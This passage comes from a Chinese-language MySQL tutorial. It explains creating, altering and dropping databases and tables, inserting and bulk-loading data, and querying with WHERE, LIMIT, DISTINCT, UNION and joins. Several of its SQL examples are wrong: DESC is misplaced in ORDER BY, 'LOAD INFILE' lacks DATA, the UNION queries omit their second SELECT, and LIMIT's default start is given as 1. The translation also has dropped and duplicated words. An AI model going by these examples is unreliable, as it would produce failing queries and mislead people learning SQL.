  \ | `BIGINT` | 下达订单的客户 ID |\n| `orderDate` | `DATETIME` | 订单下单的日期和时间 |\n\n| 表 3-6\
  \ | OrderItem 表 | 变量名 | 类型 | 描述 |\n| :--- | :--- | :--- | :--- | :--- |\n| `catalogID`\
  \ | `VARCHAR(15)` | 项目的目录编号（主键 1） |\n| `orderID` | `BIGINT` | 该项目的订单 ID（主键 2） |\n\
  | `color` | `VARCHAR(10)` | 项目的颜色 |\n| `size` | `VARCHAR(10)` | 项目的尺码 |\n| `price`\
  \ | `DECIMAL(9,2)` | 项目的价格 |\n\n\n\n\n\n# 构建数据库\n\n在你按照本章较早章节的描述仔细规划好数据库之后，就可以开始构建数据库了。数据库包含两个部分：用于存储数据的结构和数据本身。在接下来的章节中，我们将解释如何创建数据库结构。首先，你创建一个完全没有结构的空数据库，然后向其中添加表。\n\
  \n当你创建一个数据库时，会在你的数据目录中根据你分配的数据库名称创建一个新的子目录。稍后，当你向数据库添加表时，文件会被添加到该子目录。数据目录通常是 MySQL\
  \ 安装目录下的子目录。你可以通过在 MySQL 配置文件 `my.cnf` 中添加符合如下格式的语句来设置不同的目录作为数据目录：\n\n```ini\ndatadir=c:/xampp/mysql/data\n\
  ```\n\n你可以将此语句添加到配置文件，或修改已有的语句。你可以像本微型书籍第 1 章描述的那样使用 SQL 语句创建数据库。要创建数据库，你必须使用具有创建、修改和删除数据库及表权限的\
  \ MySQL 账户，我们在这里告诉你如何操作。关于 MySQL 账户的更多信息，请参阅微型书籍的第 2 章。\n\n## 创建新数据库\n\n创建新数据库的第一步是创建一个空数据库并给它命名。你的数据库名称长度最多可达\
  \ 64 个字符。你可以使用大多数字母、数字和标点符号，但有少数例外。通常情况下，你不能使用操作系统中目录名称中非法的字符（请查看你的操作系统文档以确定这些字符是什么）。\n\
  \n不要在名称末尾使用空格。不要在数据库名称（或表名）中使用正斜杠（`/`）或反斜杠（`\\`）。你可以在数据库名称中使用引号，但这种做法并不明智。\n\n要创建一个新的空数据库，请使用以下\
  \ SQL 语句：\n\n```sql\nCREATE DATABASE databasename\n```\n\n在此条语句中，将 `databasename`\
  \ 替换为你为数据库指定的名称。例如，要创建本章设计的示例数据库，请使用以下 SQL 语句：\n\n```sql\nCREATE DATABASE CustomerOrderInformation\n\
  ```\n\n某些虚拟主机公司不允许你创建新数据库。主机会提供指定数量的数据库供 MySQL 使用，你只能在指定的数据库中创建表。你可以尝试请求额外的数据库，但你需要一个正理由。MySQL\
  \ 和 PHP 并不在乎所有的表是在一个数据库中，还是组织在具有意义名称的数据库中。当项目得到良好组织时，人类更容易跟踪项目。\n\n如果已存在你指定的名称数据库，会返回错误信息。你可以在语句中使用\
  \ `IF` 短句来避免此错误信息，如下：\n\n```sql\nCREATE DATABASE IF NOT EXISTS CustomerOrderInformation\n\
  ```\n\n使用此语句，如果数据库不存在则创建它，但如果数据库已存在，语句不会失败。它只是不再创建新数据库。要亲眼验证数据库是否已创建，请使用 `SHOW DATABASES`\
  \ SQL 查询。创建空数据库后，你可以向其中添加表。（请查看本章稍后的“添加表并指定主键”章节。）\n\n## 创建和删除数据库\n\n只要你使用的是具有 `DROP`\
  \ 权限的 MySQL 账户，就可以删除任何数据库。当你删除数据库时，数据库中所有的表和数据也会被删除。你可以使用以下 SQL 语句删除数据库：\n\n```sql\n\
  DROP DATABASE databasename\n```\n\n请谨慎使用，因为这是不可逆的。删除数据库后，该数据库将永远消失。其中的任何数据也会随之消失。如果数据库不存在，会返回错误信息。你可以使用以下语句防止错误信息：\n\
  \n```sql\nDROP DATABASE IF EXISTS databasename\n```\n\n此语句会在数据库存在时将其删除。如果不存在，则不会发生错误。语句将静默执行。\n\
  \n## 添加表并指定主键\n\n你可以向任何数据库添加表，无论它是你刚刚创建的空数据库，还是已经包含表和数据的现有数据库。允许的表名规则在本文章较早的“组织数据”部分进行了解释。当你在数据库中创建一个表时，会添加名为\
  \ `tablename.frm` 的文件。\n\n当你创建一个表时，包含表定义。你定义每一列——给它一个名称、分配数据类型并指定任何其他定义。以下是经常为列指定的定义：\n\
  \n*   `NOT NULL`：此列必须有值；不能为空。\n*   `DEFAULT` 值：如果未为列提供其他值，则在创建行时存储此值。\n*   `AUTO_INCREMENT`：此定义创建一个序列号。每添加一行，该列的值就会增加\
  \ 1。你可以通过为该列分配特定值来覆盖自动计数。\n*   `UNSIGNED`：此定义表示该数值字段永远不会为负数。\n\n你还需要指定每行的唯一标识符——主键。表必须有一个每行都不同的字段或字段组合。如果你尝试添加一个与表中已有主键相同的行，将收到错误信息，该行不会被添加。\n\
  \n有时你可能想创建一个与现有表结构相同的空表。你可以使用 `CREATE` 语句向数据库添加表。语句以 `CREATE TABLE` 语句开头：\n\n```sql\n\
  CREATE TABLE tablename\n```\n\n然后，你添加带有定义的列列表。用逗号将每列的信息与后续列的信息分开。将整个列表括在括号内。每个列名后跟随其数据类型和任何所需的定义。`CREATE\
  \ TABLE` 语句的最后项指示哪一列或列组合为主键。如果你使用列组合作为主键，请将所有列名放在括号内并用逗号分隔。例如，你可以将主键指定为 `PRIMARY\
  \ KEY (columnname1,columnname2)`。完整的 `CREATE TABLE` 语句格式如下：\n\n```sql\nCREATE TABLE\
  \ tablename (\n    columnname datatype1 definition2 ...,\n    columnname datatype1\
  \ definition2 ...,\n    ...,\n    PRIMARY KEY(columnname)\n)\n```\n\n列表 3-1 显示了创建\
  \ `CustomerOrderInformation` 数据库中的 `Customer` 表的 `CREATE TABLE` 语句。如果你愿意，可以将此语句输入单行。MySQL\
  \ 不在乎你使用多少行。列表 3-1 所示的格式便于你阅读。这种友好的格式也有助于发现拼写错误。\n\n列表 3-1：\n```sql\nCREATE TABLE\
  \ Customer (\n    CustomerID SERIAL,\n    lastName VARCHAR(50),\n    firstName VARCHAR(40),\n\
  \    street VARCHAR(50),\n    city VARCHAR(50),\n    state CHAR(2),\n    zip CHAR(10),\n\
  \    email VARCHAR(50),\n    phone CHAR(15),\n    fax CHAR(15),\n    PRIMARY KEY(CustomerID)\n\
  );\n```\n\n注意，列表 3-1 中的列名列表被括号括起（第一行一行），每个列定义后面都有逗号。记住不要对列名使用任何 MySQL 保留字，我们在我们在较早的“组织数据”部分讨论的。如果你使用保留字作为列名，MySQL\
  \ 会给你一个这样的错误信息：\n\n`You have an error in your SQL syntax near ‘order var(20))’ at\
  \ line 1`\n\n此错误信息显示了它不喜欢的列定义以及它发现该定义的行。然而，该信息并没有告诉我们问题究竟是什么。它所指的 SQL 语法错误是使用了 MySQL\
  \ 保留字 `order` 作为列名。如果你尝试创建一个已存在的表，会收到错误信息。你可以使用以下 `CREATE` 语句来防止此错误信息的出现：\n\n```sql\n\
  CREATE TABLE IF NOT EXISTS tablename\n```\n\n如果表不存在，语句将创建它。如果表已存在，语句不会创建它，也不会返回错误信息。你可以按照如下方式创建一个与现有表完全相同、结构相同的新表：\n\
  \n```sql\nCREATE TABLE tablename LIKE oldtablename\n```\n\n新表 `tablename` 是与 `oldtablename`\
  \ 相同的字段和定义创建的。即使旧表包含数据，新表也不包含这些数据，只有结构。创建表后，你可以通过查询来查看它、检查其结构或删除它。\n\n*   要查看已添加到数据库的表，请使用此查询：`SHOW\
  \ TABLES`\n*   要查看表的结构，请使用此查询：`EXPLAIN tablename`\n\n## 删除表\n\n你可以删除表，无论它是空的还是包含数据。在操作之前，请确定你想要删除该表。删除表是不可逆的。删除表后，该表将永远消失。其中的任何数据也会随之消失。要删除任何表，请使用此语句：\n\
  \n```sql\nDROP TABLE tablename\n```\n\n## 修改数据库结构\n\n你的数据库不是刻在石头上的。你可以更改任何表的名称；在任何表中添加、删除或重命名列；或者更改任何列的数据类型或其他属性。更改数据库并不是罕见事件。你可能出于许多原因想要更改数据库。例如，假设你在公司所有员工名称的数据库中，将\
  \ `lastName` 列定义为 `VARCHAR(20)`。当时，20 个字符对于姓氏来说足够了。但你刚刚收到一份备忘录，宣布新的 CEO 是 John Schwartzheimer-Losertman。糟糕。MySQL\
  \ 将他的名字截断为前 20 个字母，Schwartzheimer-Loser —— 对老板来说一个不太理想的新名字。所以你需要立即加宽该列。\n\n你可以使用\
  \ `ALTER` 语句更改数据库结构。该语句的基本格式为 `ALTER TABLE tablename`，后面跟着指定的更改。表 3-7 显示了你可以做的更改。\n\
  \n\n\n\n\n## 表 3-7 使用 ALTER 语句可以更改\n\n| 更改 | 描述 |\n| :--- | :--- |\n| `ADD columnname\
  \ definition` | 添加列；`definition` 包含数据类型和可选定义。 |\n| `ALTER columnname SET DEFAULTvalue`\
  \ | 修改列的默认值。 |\n| `ALTER columnname DROP DEFAULT` | 移除列的默认值。 |\n| `CHANGE columnname\
  \ newcolumnname definition` | 修改列的定义并重命名列；`definition` 包含数据类型和可选定义。 |\n| `DROP columnname`\
  \ | 删除列，包括该列中的所有数据。该数据无法恢复。 |\n| `MODIFY columnname definition` | 修改列的定义；`definition`\
  \ 包含数据类型和可选定义。 |\n| `RENAME newtablename` | 重命名表。 |\n\n\n\n\n\n# 修改数据库结构\n\n例如，以下语句将\
  \ `Customer` 表重命名为 `NewCustomer`：\n\n```sql\nALTER TABLE Customer RENAME NewCustomer\n\
  ```\n\n另一个示例，以下语句将指定的列（`lastName`）更改为指定的类型（`VARCHAR`）和宽度（`50`）：\n\n```sql\nALTER\
  \ TABLE Customer MODIFY lastName VARCHAR(50)\n```\n\n# 第五卷：MySQL\n## 第章：使用数据库\n\n\
  本章内容：\n* 在数据库中存储数据\n* 从数据库中查看和检索数据\n* 更新数据\n* 删除数据\n\n删除一个空数据库就像打开一个空的饼干罐——你什么也得不到。搜索一个空数据库并不比搜索一个空的饼干罐更有趣或更有成效。数据库只有在它所持有的信息方面才有用。数据库需要能够接收信息进行存储，并根据请求交付信息。例如，前面的章节描述的\
  \ `CustomerOrderInformation` 数据库需要能够接收客户和订单信息，并且要在你请求时能够交付其存储的信息。例如，如果你知道某个特定客户的地址或某个特定订单的日期，数据库需要在你请求时交付这些信息。\n\
  \n你的 MySQL 数据库响应四种类型的请求：\n* **添加信息**：向表中添加行。\n* **检索信息**：查看数据。此请求不会从数据库中删除数据。\n\
  * **更新信息**：更改现有行中的信息。这包括向现有行中的空白字段中添加数据。\n* **移除信息**：从数据库中删除数据。\n\n你通过 SQL 语句和查询与数据库交互，正如本微型书籍第一章讨论的那样。本章解释了如何使用\
  \ SQL 语句和查询来你的数据库中添加、查看、检索、更新和删除信息。\n\n## 向数据库中添加信息\n\n每个数据库都需要数据。例如，你可能想向数据库中添加数据，以便用户查看。或者，你可能想创建一个空数据库供用户输入数据。在在这两种情况下，数据都会被添加到数据库中。\n\
  \n如果你的数据仍在纸上，你可以通过 SQL 语句逐行将其直接输入到 MySQL 数据库中。然而，如果你有大量数据，这个过程可能会非常枯燥并涉及大量的打字工作。假设你有\
  \ 1,000 个产品的信息必须添加到数据库中。假设你的打字速度快如闪电，每分钟可以输入一行，那就是 16 小时的快速打字——好吧，至少是快速编辑。虽然可行，但不好玩。另一方面，假设你需要向数据库中输入一个组织的\
  \ 5,000 名成员，每输入一个成员需要五分钟。现在你面对的是超过 400 小时的打字工作——谁有时间做那个？\n\n如果你有大量数据要输入，请考虑一些替代方案。有时扫描数据是一个选项。或者你可能需要请求、借用或雇佣一些帮助。在很多情况下，将数据输入到一个文本文件中可能比在单独的\
  \ SQL 语句中输入每一行更快。\n\nSQL 语句 `LOAD` 可以从大文本文件（甚至是小文本文件）中读取数据。因此，如果你的数据已经在计算机文件中，你就可以处理该文件；你不需要输入所有数据。即使数据不是以文本文件的格式（例如，在\
  \ Excel、Access 或 Oracle 文件中），你通常也可以将其转换为文本文件，然后将其读取到你的数据库中。如果数据不在计算机文件中且数据很多，先将数据以文本文件的格式输入计算机，然后在第二步将其传输到\
  \ MySQL 可能更快。\n\n大多数文本文件都可以读取到 MySQL，但某些格式比其他格式更容易读取。如果你计划将数据输入到文本文件中，请阅读“添加大量数据”部分以找到最佳格式。当然，如果数据已经在计算机上，你必须按原样处理文件。\n\
  \n### 逐行添加\n\n如果你有量较少的数据，可以一次向表中添加一行。PHP 脚本通常需要一次添加一行。例如，当 PHP 脚本从表单中接收客户提供的数据时，它需要以新行的形式将客户信息存入数据库中。\n\
  \n你使用 `INSERT` 语句向数据库添加行。该语句告诉 MySQL 要将该行添加到哪个表，以及该行中字段的值是什么。该语句的通用形式为：\n\n```sql\n\
  INSERT INTO tablename (columnname, columnname,...,columnname) VALUES (value, value,...,value)\n\
  ```\n\n以下规则适用于 `INSERT` 语句：\n* 值的列表顺序必须与列名的列表顺序相同。值列表中的第一个值将插入到列列表中第一个命名的列中；值列表中的第二个值将插入到第二个命名的列中；依此类推。\n\
  * 允许使用完整或部分列列表。你不需要列出所有列。未列出的列将赋予其默认值，或者如果没有定义默认值，则留空。记住，任何定义为 `NOT NULL` 的列必须包含值，否则语句将失败。\n\
  * 不要求提供列列表。如果你正在为所有列输入值，则完全不需要列出列。如果没有列列，MySQL 将按照在表中出现的顺序查找所有列的值。\n* 列列表和值列表必须匹配。你必须为你列出的每一列提供值，否则将收到错误信息：列数不匹配。\n\
  \n以下 `INSERT` 语句向 `Customer` 表添加一行：\n\n```sql\nINSERT INTO Customer (lastName, street,\
  \ city, state, zip, email, fax) VALUES (\"Contrary\",\"1234 Garden St\",\"Garden\"\
  ,\"NV\",\"88888\",\"maryc@garden.com\",\"\")\n```\n\n注意没有列出 `firstName`，该字段没有输入值。如果\
  \ `firstName` 被定义为 `NOT NULL`，MySQL 将不允许这样做。此外，如果 `firstName` 的定义包含默认值，则会输入默认值，但由于没有，该字段被留空。注意\
  \ `fax` 存储的值是一个空字符串。\n\n为了查看你输入的数据并确保其正确，请使用从数据库中检索数据的 SQL 查询。我们将在本章稍后的“从数据库检索信息”部分详细描述这些\
  \ SQL 查询。简而言之，以下查询检索表中的数据：\n\n```sql\nSELECT * FROM Customer\n```\n\n### 添加大量数据\n\
  \n如果你有大量数据要输入且数据已经在计算机文件中，你可以将数据从计算机文件传输到 MySQL 数据库。因为数据库中的数据按行和列组织，文本文件必须指示每列数据的开始以及行的结束位置。以下是创建该表的方法：\n\
  \n* **列**：为了指示列，使用特定字符分隔每列数据。默认情况下，MySQL 寻找制表符分隔字段。然而，如果制表符对你的数据无效，你可以选择不同的字符来分隔字段。\n\
  * **行**：同样，默认情况下预计行尾结束——尽管如果你需要，可以选择一个字符来指示行的结束。\n\n`Inventory` 表的数据文件可能如下：\n\n\
  ```\nRock\tSteely Dan\tAja\t10.99\nPop\tSemisonic\tAll Chemistry\t11.99\nRock\t\
  Beatles\tAbbey Road\t9.99\n```\n\n字段之间带有制表符的文件是制表符分隔的文件另一种另一种格式是逗号分隔的文件，其中逗号分隔字段。如果你的数据在另一个文件中，你需要将其转换为分隔文件。要将另一个软件的文件格式转换为分隔文件，请检查该软件手册。许多程序如\
  \ Excel、Access 和 Oracle 允许你将数据输出为分隔文件。对于文本文件，你可能可以使用编辑器或文字处理器的搜索替换功能将其转换为分隔格式。对于棘手的文件，你可能需要经验丰富的程序员的帮助。\n\
  \n你可以在数据文件中通过包含没有数据的分隔符来留空字段。如果字段没有定义为 `NOT NULL`（例如 `SERIAL` 字段），你可以留空，MySQL 将插入\
  \ `AUTO_INCREMENT` 值。例如，以下数据文件包含要加载到 `Customer` 表的数据：\n\n```\n,Smith,John,,Austin,TX,88888\n\
  ,Contrary,Mary,,Garden,99999\n,Strat,Jack,,NY,11111\n```\n\n此数据文件是逗号分隔的。每行以逗号开头，为\
  \ `CustomerID` 字段留空，它是 `SERIAL`。行中的其他字段也是空的，并在数据文件加载后在数据库中也是空的。\n\n从文本文件读取数据的 SQL\
  \ 语句是 `LOAD`。`LOAD` 语句的基本形式是：\n\n```sql\nLOAD DATA INFILE \"path/datafilename\"\
  \ INTO tablename\n```\n\n该语句从位于服务器的文本文件加载数据。如果文件名不包含路径，MySQL 将在表定义文件（`tablename.frm`）所在的目录查找数据文件。默认情况下，该文件位于数据库的目录下，例如\
  \ `CustomerOrderInformation`。该目录位于 MySQL 安装的主目录。例如，如果文件名为 `data.dat`，`LOAD` 语句可能会在\
  \ `C:\\Program Files\\MySQL\\Server 5.0\\data\\CustomerOrderInformation\\data.dat`\
  \ 查找文件。\n\n如果你想更改默认分隔符，`LOAD` 语句的基本形式可以带有可选短语。选项有 `FIELDS TERMINATED BY 'character'`,\
  \ `ENCLOSED BY 'character'`, `LINES TERMINATED BY 'character'`。假设你有 `Customer` 表的数据文件，但字段是用逗号而不是制表符分隔的。数据文件名为\
  \ `customer.dat`，位于数据库相同的目录。将数据读表的 SQL 语句是：\n\n```sql\nLOAD INFILE \"customer.dat\"\
  \ INTO TABLE Customer FIELDS TERMINATED BY ','\n```\n\n要使用 `LOAD DATA INFILE` 语句，MySQL\
  \ 账户必须拥有服务器上的 `FILE` 权限。我们在本微型书籍的第二章讨论 MySQL 权限。你还可以通过使用 `LOCAL` 单词从本地计算机上的文本文件中加载数据，如下：\n\
  \n```sql\nLOAD LOCAL INFILE \"path/datafilename\" INTO TABLE tablename\n```\n\n\
  你必须包含文件的路径。即使在 Windows 计算机上路径也要使用正斜杠，例如 `C:/data/file.txt`。如果在发送此语句时收到错误信息，`LOCAL`\
  \ 可能未启用。有关 `LOCAL` 关键字的更多信息，请参见 [`dev.mysql.com/doc/refman/5.1/en/load-data.html`](http://dev.mysql.com/doc/refman/5.1/en/load-data.html)。\n\
  \n# 查看数据库中的数据\n\n要查看你加载的数据以确保其正确，请使用从数据库检索数据的 SQL 查询。我们将在下一节详细描述这些类型的 SQL 查询。简而言之，使用以下查询查看表中的所有数据：\n\
  \n```sql\nSELECT * FROM Customer\n```\n\n## 查看数据库中的数据\n\n在数据输入到数据库后，你可能想浏览数据以查看其是否正确，或者获取数据库中数据的类型。你也可以浏览数据以确定有关数据库的简单信息。你可以通过以下查询查看表中包含多少记录：\n\
  \n```sql\nSELECT COUNT(*) FROM tablename\n```\n\n此查询输出表中记录的数量。\n\n\n\n\n\n## 表 4-1:\
  \ 可选择的 SQL 构造\n\n| SQL 格式 | 信息的描述 |\n| :--- | :--- |\n| `AVG(columnname)` | 返回 `columnname`\
  \ 中所有值的平均值 |\n| `COUNT(columnname)` | 返回 `columnname` 不为空的行数 |\n| `MAX(columnname)`\
  \ | 返回 `columnname` 中的最大值 |\n| `MIN(columnname)` | 返回 `columnname` 中的最小值 |\n| `SUM(columnname)`\
  \ | 返回 `columnname` 中所有值的总和 |\n\n例如，查找 `Inventory` 表中最高价格的查询语句是 `SELECT MAX(price)\
  \ FROM Inventory`。\n\n类似于 `MAX()` 和 `SUM()` 且在名称后带有括号的 SQL 单词是函数。除了表 4-1 中的函数外，SQL\
  \ 还提供了许多其他函数。某些函数（如表 4-1 中的函数）提供有关列的信息。其他函数则会更改每个所选的值。例如，`SQRT()` 返回列中每个值的平方根，而\
  \ `DAYNAME()` 返回日期列中每个值的星期几名称，而不是列中存储的实际日期。在 `SELECT` 查询中有超过 100 个函数可可用。所有函数的描述，请参阅\
  \ MySQL 在线手册：`http://dev.mysql.com/doc/refman/5.5/en/functions.html`![](img/image_rsrc167V.jpg)\n\
  \n## 按特定顺序检索数据\n\n你可能希望按照特定的顺序检索数据。例如，在 `Customer` 表中，你可能希望按姓名的字母顺序对客户进行排序。或者，在\
  \ `Inventory` 表中，你可能希望按类别对各种产品分组。\n\n在 `SELECT` 查询中，`ORDER BY` 和 `GROUP BY` 影响数据交付你的顺序：\n\
  \n### ORDER BY\n- **`ORDER BY`**: 要对信息进行排序，请在 `SELECT` 查询中添加此短语：`ORDER BY columnname`。数据按\
  \ `columnname` 升序排列。例如，如果 `columnname` 是 `lastName`，数据按姓字母顺序交付。你可以在列名之前添加 `DESC`\
  \ 来降序排序。例如：`SELECT * FROM Customers ORDER BY DESC lastName`。\n\n### GROUP BY\n-\
  \ **`GROUP BY`**: 要对信息进行分组，请使用以下短语：`GROUP BY columnname`。`columnname` 值相同的行将被分在一起。例如，使用此查询对具有相同\
  \ `Category` 的行进行分组：`SELECT * FROM Inventory GROUP BY Category`。你可以在同一个查询中使用 `GROUP\
  \ BY` 和 `ORDER BY`。\n\n## 从特定行检索数据\n\n通常，你并不想要表中的所有信息。你只需要来自选定行的信息。有三个 SQL 单词经常指定信息的来源：\n\
  \n- **`WHERE`**: 允许你从具有特定特征的数据库对象请求信息。例如，你可以请求居住在加利福尼亚州的客户名称，或者只列出特定类别的产品。\n- **`LIMIT`**:\
  \ 允许你限制检索信息的行数。例如，你可以只请求表中的前三行信息。\n- **`DISTINCT`**: 允许你只从一组完全相同的行中请求信息。例如，在 `Login`\
  \ 表中，你可以请求 `loginName` 但不指定重复名称，从而将响应限制为每个成员一条记录。这将回答“客户是否登录过？”这个问题，而不是“客户登录了多少次？”。\n\
  \n## 使用 WHERE 子句\n\n`SELECT` 查询的 `WHERE` 子句允许你进行复杂的选择。例如，假设你的老板想知道所有姓以 B 开头的客户。\n\
  \n### 表 4-2: 常用表达式\n\n| 表达式 | 示例 | 结果 |\n| :--- | :--- | :--- |\n| `column = value`\
  \ | `zip=\"12345\"` | 仅选择 `zip` 列中存储 12345 的行 |\n| `column > value` | `zip > \"\
  50000\"` | 仅选择邮政编码为 50001 或更高的行 |\n| `column >= value` | `zip >= \"50000\"` | 仅选择邮政编码为\
  \ 50000 或更高的行 |\n| `column < value` | `zip < \"50000\"` | 仅选择邮政编码为 49999 或更低的行 |\n\
  | `column <= value` | `zip <= \"50000\"` | 仅选择邮政编码为 50000 或更低的行 |\n| `column BETWEEN\
  \ value1 value2` | `zip BETWEEN \"20000\" AND \"30000\"` | 仅选择邮政编码大于 19999 但小于 30001\
  \ 的行 |\n| `column IN (value1,value2,...)` | `zip IN (\"90001\",\"30044\")` | 仅选择邮政编码为\
  \ 90001 或 30044 的行 |\n| `column NOT IN (value1,value2,...)` | `zip NOT IN (\"90001\"\
  ,\"30044\")` | 仅选择邮政编码不是 90001 或 30044 的任何行 |\n| `column LIKE value` | `zip LIKE\
  \ \"9%\"` | 选择所有邮政编码以 9 开头的行 |\n| `column NOT LIKE value` | `zip NOT LIKE \"9%\"\
  ` | 选择所有邮政编码不以 9 开头的行 |\n\n![](img/image_rsrc167X.jpg)![](img/image_rsrc167Y.jpg)\n\
  \n\n\n\n你可以将表 4-2 中的任何表达式与 `AND` 和 `OR` 组合。在某些情况下，你需要使用括号来明确选择标准。例如，你可以使用以下查询来满足你老板的紧急需求，找到所有姓以\
  \ `B` 开头、居住在印第纳波利斯（Indianapolis）且电话号码或传真号码中包含 `8` 的客户：\n\n```\nSELECT lastName,firstName\
  \ FROM Customer WHERE lastName LIKE “B%”AND city = “Indianapolis”AND (phone LIKE\
  \ “%8%” OR fax LIKE “%8%”)\n```\n\n注意最后一行中的括号。如果没有括号，你将无法获得所想要的结果。没有括号，每个连接符将按照从第一个到最后一个顺序进行处理，导致结果列表包含：所有姓以\
  \ `B` 开头且居住在印第纳波利斯且电话中包含 `8` 的客户，以及所有传真号码中包含 `8` 的客户（无论他们是否居住在印第纳波利斯，无论他们的姓是否以 `B`\
  \ 开头）。当最后一个 `OR` 被处理时，系统会选出特征匹配 `OR` 之前的表达式或 `OR` 之后表达式的客户。`OR` 之前的表达式通过之前的 `AND`\
  \ 连接到前面的表达式，因此它不是孤立的；但 `OR` 之后的表达式是孤立的，这将选出所有传真号码中包含 `8` 的客户。\n\n### 使用 `LIMIT`\
  \ 关键字\n`LIMIT` 指定了可以返回多少行。`LIMIT` 的格式为 `LIMIT startnumber,numberofrows`。你想要检索的第一行是\
  \ `startnumber`，要检索的行数是 `numberofrows`。如果没有指定 `startnumber`，则假设为 `1`。要仅选择住在德克萨斯州的前三个客户，请使用此查询：\n\
  \n```\nSELECT * FROM Customer WHERE state=”TX” LIMIT 3\n```\n\n### 使用 `DISTINCT`\
  \ 关键字\n表中的行在一个或多个列上可能有相同的值。然而，在某些情况下，当你 `SELECT` 某一列时，你不希望检索多个具有相同值的行。你只想获取一次该值。例如，假设你有一个产品表，其中有一个字段叫做\
  \ `Category`。数据中无疑包含每个类别的许多产品。现在，假设你想显示数据库中所有可用类别的列表。你希望此列表中的每个类别仅出现一次。`DISTINCT`\
  \ 关键字就是为此目的提供的。为了防止 `SELECT` 查询返回所有相同的记录，在 `SELECT` 之后立即添加 `DISTINCT` 关键字，如下：\n\n\
  ```\nSELECT DISTINCT Category FROM Product\n```\n\n### 组合来自多个表的信息\n在本章之前的节节中，我们假设你想要的所有信息都在同一个表中。然而，你可能想要组合来自不同表的信息。你可以在单个查询中轻松地实现这一点。有时你的问题需要来自多个表的信息。例如，“客户\
  \ Joe Smith 在 4 月和 12 月期间下了多少个订单？”这个问题需要来自多个表的信息。你可以通过组合多个表，在一个 `SELECT` 查询中轻松地提出这个问题。\n\
  \n`SELECT` 查询中可以使用两个单词来组合来自两个或多个表的信息：\n\n*   **`UNION`**：从一个或多个表中检索行并将它们存储在一起，一个接一个地放在单个结果集中。例如，如果你的查询从一个表中选择了\
  \ 6 行，从另一张表选择了 5 行，则结果将包含 11 行。\n*   **`JOIN`**：将表并排组合，并从两个表中检索信息。\n\n#### `UNION`\n\
  `UNION` 用于合并两个或多个 `select` 查询的结果。每个查询的结果将紧接在上一个查询的结果之后结果集中。`UNION` 查询的格式如下：\n\n\
  ```\nSELECT query UNION ALL query ...\n```\n\n你可以根据需要组合任意数量的 `SELECT` 查询。`SELECT`\
  \ 查询可以包含任何有效的 `SELECT` 格式，包括 `WHERE` 子句、`LIMIT` 子句等。查询的规则是：\n*   所有 `SELECT` 查询必须选择相同数量的列。\n\
  *   查询中选择的列必须包含相同类型的数据。结果集包含第一个查询的所有行，紧接着是第二个查询的所有行，依此类推。结果集中使用的列名是来自第一个 `SELECT`\
  \ 查询的列名。\n\n一系列 `SELECT` 查询可以从同一张表选择不同的列，但如果你想要在一个新表中先是该表的一列，紧接着是同一张表的另一列，这种情况是不常的。更有可能的情况是你想要组合来自不同表的列。例如，你可能有一张已退部的成员表（`OldMember`）和另一张独立的当前成员表（`Member`）。你可以通过以下查询获取所有成员（包括当前和退部）的列表：\n\
  \n```\nSELECT lastName,firstName FROM Member UNION ALL lastName,firstName FROM OldMember\n\
  ```\n\n该查询的结果是所有当前成员的姓和名，然后是所有退部成员的姓和名。根据你组织数据的方式，可能会有重复的名字。例如，可能某个成员退部了，他的名字在 `OldMember`\
  \ 中——但他再次加入了，所以他的名字被添加到了 `Member` 表中。如果你不想要重复，请不要包含 `ALL` 单词。如果不包含 `ALL`，结果中就不会添加重复行。\n\
  \n你可以在每个 `SELECT` 查询中使用 `ORDER BY`，正如我们在本章之前的“按顺序检索数据”部分讨论的那样，或者你可以使用 `ORDER BY`\
  \ 配合 `UNION` 查询进行排序。如果你希望 `ORDER BY` 适用于整个结果集，而不是仅仅适用于它后面的查询，请使用括号：\n\n```\n(SELECT\
  \ lastName FROM Member UNION ALL lastName FROM OldMember) ORDER BY lastName\n```\n\
  \n#### Join\n并排组合表是 `join`。表通过它们共同拥有的列进行组合。`join` 产生的组合表包含两个表的所有列。例如，如果 `table1`\
  \ 有两列（`memberID` 和 `height`），而 `table2` 有两列（`memberID` 和 `weight`），`join` 会产生一个包含四列的表：来自\
  \ `table1` 的 `memberID` 和 `height`，来自 `table2` 的 `memberID` 和 `weight`。\n\n两种连接类型是\
  \ `inner join` 和 `outer join`。`inner join` 和 `outer join` 的区别在于结果集中包含的行数。\n\n* \
  \  **`inner join`**：`inner join` 产生的结果表包含两个表中共同行。\n*   **`outer join`**：`outer join`\
  \ 产生的组合表包含一个表中所有的行，对于第二个表中不存在的列为空。\n\n例如，如果 `table1` 包含 `Joe` 和 `Sally` 的行，而 `table2`\
  \ 只包含 `Sally` 的行，那么 `inner join` 将包含一行：`Sally` 的行。然而，`outer join` 将包含两行——`Joe` 的行和\
  \ `Sally` 的行——尽管 `Joe` 的行 `weight` 字段是空的。`outer join` 的结果表包含一个表的所有行。如果该表的某些行在第二个表中不存在，则第二个表的列将为空。显然，结果表的内容取决于哪个表贡献了所有行，并要求第二个表进行匹配。两种类型的外部连接控制哪个表设置行，哪个表必须匹配：`LEFT\
  \ JOIN` 和 `RIGHT JOIN`。\n\n你使用不同的 `SELECT` 查询来执行 `inner join` 和两种类型的外部连接。以下查询是 `inner\
  \ join`：\n\n```\nSELECT columnnamelist FROM table1,table2 WHERE table1.col2 = table2.col2\n\
  ```\n\n而这些查询是外部连接：\n\n```\nSELECT columnnamelist FROM table1 LEFT JOIN table2 ON\
  \ table1.col1=table2.col2\nSELECT columnnamelist FROM table1 RIGHT JOIN table2 ON\
  \ table1.col1=table2.col2\n```\n\n\n\n\n| 名称 | 类型 | 名称 | 颜色 |\n| :--- | :--- | :---\
  \ | :--- |\n| T-shirt | Shirt | T-shirt | white |\n| T-shirt | Shirt | T-shirt |\
  \ red |\n\n请注意，结果表中只出现了 `T-shirt` —— 这是因为在连接之前，只有 `T-shirt` 同时存在于两张原始表中。另一方面，假设你使用以下查询进行左外连接：`SELECT\
  \ * FROM Product LEFT JOIN Color ON Product.Name=Color.Name`\n\n你得到了以下结果表，具有相同的四列\
  \ —— `Name`（来自 `Product`）、`Type`、`Name`（来自 `Color`）和 `Color` ——但行有所不同：\n\n| 名称 |\
  \ 类型 | 名称 | 颜色 |\n| :--- | :--- | :--- | :--- |\n| T-shirt | Shirt | T-shirt | white\
  \ |\n| T-shirt | Shirt | T-shirt | red |\n| Dress shirt | Shirt | <NULL> | <NULL>\
  \ |\n| Jeans | Pants | <NULL> | <NULL> |\n\n该表有四行。它的前两行与内连接相同，但额外增加了两行 —— 这些行于左侧的\
  \ `Product` 表中，但在 `Color` 表中。注意，最后两行来自 `Color` 表的列是空的。\n\n此外，假设你使用以下查询进行右外连接：`SELECT\
